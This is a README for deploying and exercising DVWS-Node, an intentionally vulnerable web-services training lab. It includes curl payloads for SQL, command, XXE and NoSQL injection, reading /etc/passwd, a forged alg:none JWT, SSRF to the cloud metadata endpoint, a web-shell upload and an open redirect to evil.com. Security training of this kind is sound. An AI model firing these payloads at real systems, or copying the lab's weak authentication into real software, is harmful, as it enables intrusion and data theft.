# DVWS-Node -- Damn Vulnerable Web Services

Modern Node.js vulnerable application with REST, SOAP, GraphQL, and XML-RPC attack surfaces. 32 vulnerability categories across MySQL + MongoDB databases.

> **WARNING**: Intentionally vulnerable -- for authorized testing only.

## Tech Stack

| Component | Technology |
|-----------|-----------|
| Backend | Node.js, Express |
| Databases | MySQL 8 + MongoDB 4.0.4 |
| APIs | REST, SOAP, GraphQL (Apollo), XML-RPC |
| Docs | Swagger UI (OpenAPI) |
| Auth | JWT (intentionally weak: `alg:none` accepted, secret = `access`) |

## Default Credentials

| Username | Password | Role |
|----------|----------|------|
| `admin` | `letmein` | Admin |
| `test` | `test` | Regular user |

> Both databases are reset on every container restart (startup_script.js re-seeds).

---

## Vulnerability Catalog (32 Categories)

### Injection
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 1 | SQL Injection | `/api/v2/passphrase/:username` | GET |
| 2 | SQL Injection (GraphQL) | `:4000` -- `getPassphrase` query | POST |
| 3 | NoSQL Injection | `/api/v2/notesearch` | POST |
| 4 | OS Command Injection | `/api/v2/sysinfo/:command` | GET |
| 5 | XXE Injection (XML export) | `/api/v2/users/profile/export/xml` | GET/POST |
| 6 | XXE Injection (XML import) | `/api/v2/users/profile/import/xml` | POST |
| 7 | XXE Injection (notes import) | `/api/v2/notes/import/xml` | POST |
| 8 | XXE Injection (SOAP) | `/dvwsuserservice` | POST |
| 9 | XPath Injection | various | - |
| 10 | LDAP Injection | `/api/v2/users/ldap-search` | GET/POST |
| 11 | XML Injection | various | - |
| 12 | SOAP Injection | `/dvwsuserservice` | POST |
| 13 | CRLF Injection | various | - |

### Broken Access Control
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 14 | BOLA/IDOR (notes) | `/api/v2/notes/:noteId` | GET/PUT/DELETE |
| 15 | BOLA/IDOR (GraphQL) | `:4000` -- `userFindbyId`, `noteFindbyId` | POST |
| 16 | Broken Admin Access | `/api/v2/admin/logs` | GET |
| 17 | Mass Assignment | `/api/v2/users`, `/api/v2/admin/create-user` | POST |
| 18 | Horizontal Privilege Escalation | `/api/v2/passphrase/:username` | GET |

### Authentication & Session
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 19 | JWT `alg:none` bypass | `/api/v2/login` | POST |
| 20 | JWT weak secret (`access`) | `/api/v2/login` | POST |
| 21 | Brute force (weak rate limit) | `/api/v2/login` | POST |

### SSRF & Network
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 22 | SSRF (file download) | `/api/download` | POST |
| 23 | SSRF (XML-RPC) | `:9090/xmlrpc` -- `dvws.CheckUptime` | POST |

### File & Data
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 24 | Unrestricted File Upload | `/api/upload` | POST |
| 25 | Arbitrary File Write (GraphQL) | `:4000` -- `updateUserUploadFile` mutation | POST |
| 26 | Path Traversal | `/api/upload` | GET |
| 27 | Sensitive Data Exposure | `/api/v2/notesearch/all`, `/api/v2/export` | GET/POST |

### Misconfiguration & Other
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 28 | GraphQL Introspection | `:4000` | POST |
| 29 | GraphQL Batching (brute force) | `:4000` | POST |
| 30 | Open Redirect | `/api/v2/users/logout/:redirect` | GET |
| 31 | CORS Misconfiguration | various | - |
| 32 | Information Disclosure | `/api/v2/info`, `/openAPI-spec.json`, `/api-docs` | GET |

---

## EC2 Deployment (One Command)

### 1. Launch EC2
- **AMI**: Ubuntu 22.04 or Amazon Linux 2023
- **Type**: t2.micro (or larger for faster builds)
- **Security Group**: SSH (22) + TCP 80 + TCP 4000 + TCP 9090 -- your IP only

### 2. Deploy (first time or any update)

```bash
# from folder /redamon
scp -i ~/.ssh/guinea_pigs.pem guinea_pigs/dvws-node/setup.sh ubuntu@15.160.68.117:~/setup.sh && ssh -i ~/.ssh/guinea_pigs.pem ubuntu@15.160.68.117 "bash ~/setup.sh"
```

### 3. Wipe & Clean (remove everything)

```bash
# from folder /redamon
ssh -i ~/.ssh/guinea_pigs.pem ubuntu@15.160.68.117 "cd ~/dvws-node && sudo docker-compose down --volumes && sudo docker system prune -a -f --volumes && rm -rf ~/dvws-node"
```

---

## Services & Ports

| Port | Service | URL |
|------|---------|-----|
| 80 | REST API + SOAP + Swagger UI | `http://<IP>/` |
| 80 | Swagger UI | `http://<IP>/api-docs` |
| 80 | OpenAPI Spec | `http://<IP>/openAPI-spec.json` |
| 80 | SOAP WSDL | `http://<IP>/dvwsuserservice?wsdl` |
| 4000 | GraphQL Playground | `http://<IP>:4000/` |
| 9090 | XML-RPC | `http://<IP>:9090/xmlrpc` |

---

## Test Vulnerabilities

### Authenticate (get JWT token)

```bash
# Login as admin
TOKEN=$(curl -s -X POST http://<IP>/api/v2/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"letmein"}' | jq -r '.token')

echo $TOKEN
```

### SQL Injection

```bash
# SQLi on passphrase endpoint (requires auth)
curl -s http://<IP>/api/v2/passphrase/admin%27%20OR%20%271%27%3D%271 \
  -H "Authorization: Bearer $TOKEN"
```

### OS Command Injection

```bash
# Execute 'id' command on the server (requires auth)
curl -s http://<IP>/api/v2/sysinfo/id \
  -H "Authorization: Bearer $TOKEN"

# Chained command
curl -s http://<IP>/api/v2/sysinfo/id%3Bcat%20/etc/passwd \
  -H "Authorization: Bearer $TOKEN"
```

### XXE Injection

```bash
# XXE to read /etc/passwd
curl -s -X POST http://<IP>/api/v2/users/profile/import/xml \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>'
```

### NoSQL Injection

```bash
# NoSQL injection on note search
curl -s -X POST http://<IP>/api/v2/notesearch \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"search":{"$gt":""}}'
```

### JWT alg:none Bypass

```bash
# Craft a token with alg:none (no signature needed)
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"username":"admin","admin":true}
FORGED=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=').$(echo -n '{"username":"admin","admin":true}' | base64 -w0 | tr '+/' '-_' | tr -d '=').

curl -s http://<IP>/api/v2/admin/logs \
  -H "Authorization: Bearer $FORGED"
```

### SSRF via XML-RPC

```bash
# SSRF: make the server fetch an arbitrary URL
curl -s -X POST http://<IP>:9090/xmlrpc \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>dvws.CheckUptime</methodName><params><param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param></params></methodCall>'
```

### GraphQL Introspection

```bash
# Dump entire schema
curl -s -X POST http://<IP>:4000/ \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
```

### GraphQL IDOR

```bash
# Access any user by ID
curl -s -X POST http://<IP>:4000/ \
  -H "Content-Type: application/json" \
  -d '{"query":"{ userFindbyId(id: \"1\") { username email admin } }"}'
```

### BOLA/IDOR on Notes

```bash
# Access another user's note by guessing noteId
curl -s http://<IP>/api/v2/notes/<noteId> \
  -H "Authorization: Bearer $TOKEN"
```

### Open Redirect

```bash
curl -v http://<IP>/api/v2/users/logout/https://evil.com
# Observe 302 redirect to https://evil.com
```

### Unrestricted File Upload

```bash
# Upload a web shell
curl -s -X POST http://<IP>/api/upload \
  -F "file=@shell.php"
```

---

## Architecture

```
                 ATTACKER
                    |
      +-------------+-------------+
      |             |             |
   Port 80      Port 4000     Port 9090
      |             |             |
+-----v------+ +---v----+ +-----v------+
| Express.js | | Apollo | | XML-RPC    |
| REST API   | |GraphQL | | Server     |
| SOAP       | |Playgr. | |            |
| Swagger UI | |        | |            |
+-----+------+ +---+----+ +-----+------+
      |             |             |
      +------+------+------+------+
             |             |
        +----v----+   +----v-----+
        | MySQL 8 |   |MongoDB   |
        | SQLi    |   |4.0.4     |
        | targets |   |NoSQLi    |
        +---------+   |Auth/Notes|
                      +----------+
```

---

## AWS Target Group Health Check

| Setting | Value |
|---------|-------|
| **Path** | `/api/v2/info` |
| **Port** | `80` |
| **Protocol** | `HTTP` |
| **Success codes** | `200` |

---

## References

- [DVWS-Node GitHub](https://github.com/snoopysecurity/dvws-node)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)

---

## Cleanup

```bash
cd ~/dvws-node
sudo docker-compose down --volumes
sudo docker system prune -a -f --volumes
rm -rf ~/dvws-node
# Then terminate EC2 instance if no longer needed
```
